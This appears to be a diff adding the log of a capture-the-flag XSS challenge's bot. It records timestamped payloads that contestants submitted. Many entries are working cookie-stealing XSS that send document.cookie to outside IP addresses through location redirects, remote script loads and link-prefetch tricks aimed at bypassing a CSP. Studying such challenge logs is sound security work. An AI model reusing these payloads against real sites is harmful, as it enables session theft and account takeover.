@@ -1,0 +1,79 @@
+1ec70a9b11600a9239b2639b56a3038e
+[ERROR] [Errno 104] Connection reset by peer
+1ec70a9b11600a9239b2639b56a3038e
+no alert
+2017-06-24 Saturday 19:48:36 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><iframe src="/xss2/f1ag_1s_h3r3_2333"></iframe>
+<script src="http://123.207.24.193:8099/xss2/admin233333333_message.php?r=16151aae188a4bba6cb8fa2402d14dfe"></script></body></html>
+6b40086507ff0cbd346da9c2f034c5ea
+[ERROR] Message: Service chromedriver unexpectedly exited. Status code was: -9
+
+6b40086507ff0cbd346da9c2f034c5ea
+no alert
+2017-06-24 Saturday 19:50:38 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>//gg<link rel="prefetch" href="http://121.42.175.111:2333/" />
+location.href='http://121.42.175.111:8080/xss/xss_new.php?cookie=' + escape(document.cookie);</body></html>
+7a02f296e020a8db7e7db69c07a1de9c
+[ERROR] ''
+[ERROR] [Errno 111] Connection refused
+98c79ec1e8f8ca655530ce497bab3e9c
+no alert
+2017-06-24 Saturday 19:53:21 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>//gg范德萨发发的方式是否水电费水电费水电费水电费水电费阿大声道是的<link rel="prefetch" href="http://121.42.175.111:2333/" />
+location.href='http://121.42.175.111:8080/' + escape(document.cookie);
+</body></html>
+663f2fbb2bf98c1204452ec4ce608c6c
+no alert
+2017-06-24 Saturday 19:54:05 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>//gg发顺丰的大师法水电费大厦法定分是的水电费阿凡达阿斯蒂芬阿士大夫撒反对啊<link rel="prefetch" href="http://121.42.175.111:1234/" />
+location.href='http://121.42.175.111:8080/xss/xss_new.php?cookie=' + escape(document.cookie);
+</body></html>
+1fc4ae48ba67655e910f19efa66593b5
+no alert
+2017-06-24 Saturday 19:54:59 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body></body></html>
+a2f3c33fd38042e024cac159e67ba7b7
+no alert
+2017-06-24 Saturday 19:59:38 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>window.location="http://47.94.3.90/a.php?a="+document.cookie</body></html>
+6c1fa6948690f1e905f4a7fb08b98c5b
+no alert
+2017-06-24 Saturday 20:01:57 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><script src="http://123.207.24.193:8099/xss2/admin233333333_message.php"></script></head><body></body></html>
+1061324b13b0c8295e22c6cccff2ae1e
+no alert
+2017-06-28 Wednesday 12:40:12 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="prefetch" href="http://47.94.3.90/a?" /></head><body></body></html>
+448de39d501969e4dd3966057cec4aa9
+no alert
+2017-06-28 Wednesday 12:44:54 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="prefetch" href="http://47.94.3.90/a?" /></head><body></body></html>
+baee35aa1390cf8e9959d816223fe116
+no alert
+2017-06-28 Wednesday 12:48:48 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="prefetch" href="http://47.94.3.90/a?" /></head><body></body></html>
+4e1ea12571165254efb26d4c8247beb8
+no alert
+2017-06-28 Wednesday 12:51:25 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="prefetch" href="http://47.94.3.90/a?" /></head><body></body></html>
+298086623ce0fa184c476ae924209af9
+no alert
+2017-06-28 Wednesday 12:54:40 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><script>window.location="http://47.94.3.90/cookie?"+document.cookie</script>
+<link rel="prefetch" href="http://47.94.3.90/b" /></head><body></body></html>
+e5056d5af4db63ac1758b253f11bd239
+no alert
+2017-06-28 Wednesday 12:56:03 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><script src="http://123.207.24.193:8099/xss2/admin233333333_message.php?r=298086623ce0fa184c476ae924209af9"></script></head><body></body></html>
+b21eb91330f1bd0f239f91c38b6c555d
+no alert
+2017-06-28 Wednesday 12:59:25 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="prefetch" href="http://47.94.3.90/c?" />
+<script src="http://123.207.24.193:8099/xss2/admin233333333_message.php?r=298086623ce0fa184c476ae924209af9"></script></head><body></body></html>
+92c8c83648ace921d44463a72bd95775
+no alert
+2017-06-28 Wednesday 13:09:17 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>window.location="http://47.94.3.90/cookie?"+document.cookie//<link rel="prefetch" href="http://47.94.3.90/b" /></body></html>
+24ba099e82a4be5407f1b4233c445582
+no alert
+2017-06-28 Wednesday 13:10:22 CST:   <!DOCTYPE html PUBLIC "-//IETF//DTD HTML 2.0//EN"><html xmlns="http://www.w3.org/1999/xhtml"><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /cookie was not found on this server.</p>
+
+</body></html>
+b736d8f538a1f360bbe499cb6c6f11c0
+no alert
+2017-06-28 Wednesday 14:33:04 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>发顺丰的</body></html>
+b774e0a029d3af61c96f9a1267f34e53
+no alert
+2017-06-29 Thursday 09:56:57 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="prefetch" href="http://139.199.187.159/rec.php?c=[cookie]" /></head><body></body></html>
+930cc8140a50430cb6a29095661fe9a0
+no alert
+2017-06-29 Thursday 10:00:56 CST:   <html xmlns="http://www.w3.org/1999/xhtml"><head><link rel="prefetch" href="http://139.199.187.159/rec.php?c=[cookie]" /></head><body></body></html>
